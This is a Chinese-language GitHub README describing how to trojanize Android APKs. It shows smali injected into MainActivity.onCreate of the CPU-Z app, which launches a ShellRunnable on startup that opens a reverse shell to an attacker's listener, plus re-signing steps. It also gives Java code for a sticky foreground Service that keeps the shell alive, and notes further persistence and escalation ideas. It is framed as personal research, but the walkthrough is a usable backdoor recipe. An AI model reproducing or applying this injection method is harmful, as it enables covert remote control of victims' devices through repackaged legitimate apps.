# ApkInjectionResearch
**一个实现向安卓程序中注入恶意代码的研究。**

  研究的起因是看见[520_APK_HOOK](https://github.com/ba0gu0/520apkhook/)这个项目，感觉很有意思，于是想研究一下安卓程序的执行流程，不同框架的区别，以及在不同版本环境下的代码注入应该怎么做。

---

### 目前已经实现的功能
1. 在 MainActivity.smali 的 onCreate 方法中注入代码，随着应用启动而自启动。
2. 在 ShellRunnable 中编写使用 socket 连接反弹 Shell 的逻辑。
3. 反弹 shell 仅在 app 进程存活期间有效，app 被杀死或卸载后连接会断开。
4. 可以执行大部分命令，有一些命令好像有bug？？？

---

### 对研究内容的理解
#### 1. 操作流程
1. **反编译 APK**  
   - 使用 apktool 将原始 APK (CPU-Z) 反编译，得到 smali 代码。

2. **插入自定义 smali 代码**  
   - 在 MainActivity 同级目录下新增了 ShellRunnable.smali，实现了一个 `Runnable`，用于反弹 shell。
   - 在 `MainActivity.smali` 的 `onCreate` 方法中插入如下代码：
     
     ```smali
     new-instance v0, Lcom/cpuid/cpu_z/ShellRunnable;
     invoke-direct {v0}, Lcom/cpuid/cpu_z/ShellRunnable;-><init>()V
     new-instance v1, Ljava/lang/Thread;
     invoke-direct {v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
     invoke-virtual {v1}, Ljava/lang/Thread;->start()V
     ```

3. **重新打包并签名 APK**  
   - 用 apktool 重新打包修改后的 APK，并用自签名证书工具 [dx-signer](https://github.com/dingxiangtech/dx-signer) 签名。

3. **监听端口反弹shell**
   - 我使用的是花生壳的内网穿透（体验版就够用了）， windows 端配置好 nc 打开监听，安装好花生壳连接上。
   ![image](https://github.com/user-attachments/assets/6e2c5307-4013-4ff9-a713-66d30f918087)
   - 打开应用就能连接上 shell 了。
   ![image](https://github.com/user-attachments/assets/ab0b72d1-2fe1-46c9-835f-c6ca923572d8)

---

#### 2. 程序运行流程
1. **应用启动**  
   用户启动应用，`MainActivity` 的 `onCreate` 方法被调用。

2. **启动反弹 shell 线程**  
   - `onCreate` 方法中新建并启动了一个 `ShellRunnable` 线程。

3. **ShellRunnable 线程执行反弹 shell**  
   - 线程尝试连接你的服务器（如 `yourip:port`）
   - 连接成功后，启动本地 `sh` 进程（Android shell）
   - 建立 socket 与 shell 的输入输出流转发。
   - 服务器端输入通过 socket 传给 shell，shell 的输出通过 socket 传回服务器。

4. **远程控制**  
   - 在服务器端通过 shell 执行命令，下载文件、查看目录等，权限等同于该 app 的权限（非 root）。

---

#### 3. 权限与限制
- 由于 Android 不允许普通 app 注册系统级自启动（如 Linux 的 rc.local、init.d）。反弹 shell 的权限也仅限于该 app 的沙箱权限，不能越权访问系统或其他 app 的数据。
  
- 所以就算用动态加载方法保存到 `/storage/emulated/0` 的文件，其他 app 可能能看到，但也无法直接“激活”你的 app 或让你的 shell 常驻，因为只有 root 权限或系统漏洞才能实现真正的权限维持。
  
- 后面也看过一些方法来做权限维持，比如说连接到 shell 之后及时使用 msf 上传并执行 .sh 脚本[https://cloud.tencent.com/developer/article/1043684](https://cloud.tencent.com/developer/article/1043684)
  
- 又或者新建一个继承自 `android.app.Service` 的 smali 类（如 ShellService.smali）。在 onStartCommand 里启动 ShellRunnable 线程。
  
- 在 AndroidManifest.xml 注册 Service，并加 `<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>`（Android 9+）。启动 Service 时用 startForeground，这样系统不会轻易回收。
  
- 原理就是将 ShellRunnable 放到 Service 中运行，而不是 Activity ，将 Service 设置为前台服务（Foreground Service），这样即使应用切后台，线程也不会被系统轻易杀死。

```Java
public class ShellService extends Service {
    public int onStartCommand(Intent i, int f, int s) {
        new Thread(new ShellRunnable()).start();
        // 前台服务（Android 8+必须）
        startForeground(1, new Notification());
        return START_STICKY;
    }
    public IBinder onBind(Intent i) { return null; }
}
```

- 如果 Service 被杀死，可以用 JobService 或 AlarmManager 定时重启 Service，提升存活率。
  
- 最后的方法就是把设备 root 了，就可以用 native 守护进程方式。

---

#### 3. 代码优化
因为一开始注入的时候经常出现闪退或者连接断开的问题，所以使用了 sleep 来减慢数据处理的速度（虽然好像没啥影响，纯折腾qaq）
所以可以把下面这些代码优化掉，当然要是不想删可以把 `const-wide/16 v9, 1` 的延迟改低，或者设置缓冲区来读取多个字节。

```smali
    :sleep
    invoke-virtual {v8}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V
    const-wide/16 v9, 1
    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V
    goto :loop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

---

#### 3. 错误日志分析
当完成上面的操作但是打开会报错的时候可以用 adb 连接真机或者虚拟机来提取错误日志 `adb logcat -v time *:E >C:\log.log`

例如我在对另一个 apk 注入代码的时候会闪退，我们把错误日志提取出来，直接找到 `beginning of crash` 开始分析

其实这里很明显意思就是 MainActivity 的 onCreate 方法中寄存器类型发生错乱

因为原本声明的 .locals 11 数量要大于用到的最大寄存器编号（如 v11 就要 .locals 12）

并且 onCreate 方法后续代码里，v0还被当作 MainActivity 的 this 对象或 int 用。

```log
--------- beginning of crash
06-05 15:20:00.156 E/AndroidRuntime( 4017): FATAL EXCEPTION: main
06-05 15:20:00.156 E/AndroidRuntime( 4017): Process: dev.anilbeesetti.nextplayer, PID: 4017
06-05 15:20:00.156 E/AndroidRuntime( 4017): java.lang.VerifyError: Verifier rejected class dev.anilbeesetti.nextplayer.MainActivity: void dev.anilbeesetti.nextplayer.MainActivity.onCreate(android.os.Bundle) failed to verify: void dev.anilbeesetti.nextplayer.MainActivity.onCreate(android.os.Bundle): [0xE] 'this' argument 'Precise Reference: dev.anilbeesetti.nextplayer.ShellRunnable' not instance of 'Precise Reference: dev.anilbeesetti.nextplayer.MainActivity' (declaration of 'dev.anilbeesetti.nextplayer.MainActivity' appears in /data/app/~~Fm2FWSDlprIBhBCsWywQoQ==/dev.anilbeesetti.nextplayer-sf2NpCwE-CCvByUGT0kA5w==/base.apk)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at java.lang.Class.newInstance(Native Method)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.AppComponentFactory.instantiateActivity(AppComponentFactory.java:95)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.Instrumentation.newActivity(Instrumentation.java:1291)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3648)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3931)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:103)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2294)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.os.Handler.dispatchMessage(Handler.java:106)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.os.Looper.loopOnce(Looper.java:201)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.os.Looper.loop(Looper.java:288)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at android.app.ActivityThread.main(ActivityThread.java:8060)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at java.lang.reflect.Method.invoke(Native Method)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:571)
06-05 15:20:00.156 E/AndroidRuntime( 4017): 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1091)
```
总结一下就是：
1. .locals 数量要大于你用到的最大寄存器编号
2. 不要把 v0、v1 等 this/int 类型寄存器用来存对象

至此，传统 Android 框架的 apk 应该都可以通过手动修改来注入代码了，接下来有空再玩玩 Flutter 。

---

### 未来的研究方向
现在也只实现了这一个传统的 onCreate() 注入方式，但是在 Flutter 应用中， UI 由 Flutter 引擎渲染，MainActivity 只是一个原生容器。

此时传统的 onCreate() 主要初始化 Flutter 环境，而不是应用主逻辑的入口点。所以还要不断尝试是在 <init> 构造器中注入还是在 F()、 onCreate() 方法中更合适。

**除了实现代码注入，还可以玩一些骚操作，类似于 MSF 里面的 `android/meterpreter/reverse_tcp` 模块，可以实现加密传输、反射调用、动态加载、持久化、甚至可以集成一些权限提升的功能。**
